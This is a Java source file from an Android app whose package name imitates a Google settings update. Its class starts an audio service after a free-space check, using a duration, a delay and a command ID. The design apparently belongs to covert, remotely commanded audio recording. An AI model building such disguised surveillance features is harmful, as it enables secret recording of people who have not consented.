package com.setting.dl.google.googlesettingupdate.audio;

import android.content.Context;

import com.setting.dl.google.googlesettingupdate.FreeSpaceManager;
import com.setting.dl.google.googlesettingupdate.concurrent.WorkerThread0;
import com.setting.dl.google.googlesettingupdate.concurrent.interfaces.IBackgroundWorker;
import com.setting.dl.google.googlesettingupdate.concurrent.interfaces.IWorkerHandler;

public class AudioServiceController implements IBackgroundWorker<Boolean>, IWorkerHandler<Boolean> {
   
   private Context context;
   private long    duration;
   private long    delay;
   private String  commandId;
   private boolean high;
   
   
   public AudioServiceController(Context context, long duration, long delay, String commandId, boolean high) {
      
      this.context = context;
      this.duration = duration;
      this.delay = delay;
      this.commandId = commandId;
      this.high = high;
      
      new WorkerThread0<Boolean>()
            .workOnBackground(this)
            .handleOnForeground(this)
            .start();
   }
   
   private void startAudioService(){
      
      AudioService.startAudio(context, duration, delay, commandId, high);
   }
   
   @Override
   public Boolean doit() {
      
      boolean space = new FreeSpaceManager(context).isOkey();
   
      if (!space) {
         
         return false;
      }
      
      return true;
   }
   
   @Override
   public void onWorkResult(Boolean result) {
      
      if (result) {
         
         startAudioService();
      }
   }
}
